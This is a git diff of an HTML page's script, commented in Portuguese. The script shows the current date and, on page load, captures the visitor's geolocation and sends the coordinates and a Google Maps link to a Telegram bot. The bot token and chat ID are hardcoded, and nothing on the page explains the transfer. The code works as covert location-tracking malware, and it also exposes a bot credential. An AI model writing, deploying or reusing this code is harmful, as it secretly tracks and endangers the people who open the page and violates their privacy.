@@ -137,55 +137,59 @@
   </div>
 
   <script>
-    window.addEventListener("load", () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-      } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
-      }
-    });
-
+    // Formata a data atual
     const dataAtual = new Date();
     const dia = String(dataAtual.getDate()).padStart(2, '0');
     const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
     const ano = dataAtual.getFullYear();
+    document.getElementById("data-atual").textContent = `${dia}/${mes}/${ano}`;
 
-    const dataFormatada = `${dia}/${mes}/${ano}`;
-
-    document.getElementById("data-atual").textContent = dataFormatada;
-
-    console.log(dataAtual)
-
-    function sendLocation(position) {
-    const latitude = position.coords.latitude;
-    const longitude = position.coords.longitude;
-    const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-    
-    const token = "7831329628:AAGx6FcHUycdGUHV0ts6PcPmCRQZpgx1KbE";
-    const chat_id = "1377491030";
-
-    const text = `📍 Localização capturada:\nLatitude: ${latitude}\nLongitude: ${longitude}\n${maps}`;
-
-    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: {
-        "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-        chat_id,
-        text
-        })
-    })
-    .then(res => res.json())
-    .then(data => {
-        console.log("Enviado com sucesso:", data);
-    })
-    .catch(error => {
-        console.error("Erro:", error);
+    // Quando a página carregar
+    window.addEventListener("load", () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      } else {
+        alert("Seu navegador não suporta geolocalização.");
+      }
     });
+
+     // Caso a geolocalização falhe
+     function handleError(error) {
+      console.error("Erro ao obter localização:", error.message);
     }
 
+    // Envia localização para o Telegram
+    function sendLocation(position) {
+  const latitude = position.coords.latitude;
+  const longitude = position.coords.longitude;
+  const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+  
+    const token = "7831329628:AAGx6FcHUycdGUHV0ts6PcPmCRQZpgx1KbE"
+    const chat_id = "1377491030";
+    const text = `Localização capturada:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMapa: ${maps}`;
+
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: chat_id,
+      text: text
+    })
+  })
+  .then(response => response.json())
+  .then(data => {
+    console.log("Mensagem enviada:", data);
+  })
+  .catch(error => {
+    console.error("Erro ao enviar para o Telegram:", error);
+  });
+
+}	
   </script>
 </body>
 
 </html>
+
